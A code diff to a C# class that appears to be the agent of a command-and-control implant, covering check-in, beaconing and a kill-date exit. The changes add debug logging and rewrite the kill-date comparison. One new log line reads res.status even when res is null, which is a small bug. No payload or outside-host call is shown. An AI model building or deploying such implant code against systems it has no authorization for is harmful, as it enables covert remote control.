@@ -35,7 +35,9 @@ namespace Agent
                 Environment.Exit(0);
             }
             await this.CheckIn();
+            logger.Log("Starting beacon.");
             await this._profile.StartBeacon();
+            logger.Log("Beacon exited.");
         }
         private IProfile SelectProfile(int index)
         {
@@ -54,6 +56,7 @@ namespace Agent
         /// </summary>
         public async Task<bool> CheckIn()
         {
+            logger.Log("Starting checkin.");
             Checkin ct = new Checkin()
             {
                 action = "checkin",
@@ -74,8 +77,11 @@ namespace Agent
 
                 if (res is null || res.status != "success")
                 {
+                    logger.Log("Checkin failed.");
+                    logger.Log(res.status);
                     return false;
                 }
+                logger.Log("Checkin Succeed");
 
                 this.updateAgentInfo(res);
 
@@ -134,7 +140,10 @@ namespace Agent
         //Is this correct?
         private bool CheckKillDate()
         {
-            return DateTime.Now < this.config.killDate;
+            logger.Log($"is {this.config.killDate} greater than {DateTime.Now}?");
+
+
+            return this.config.killDate > DateTime.Now;
         }
     }
 }
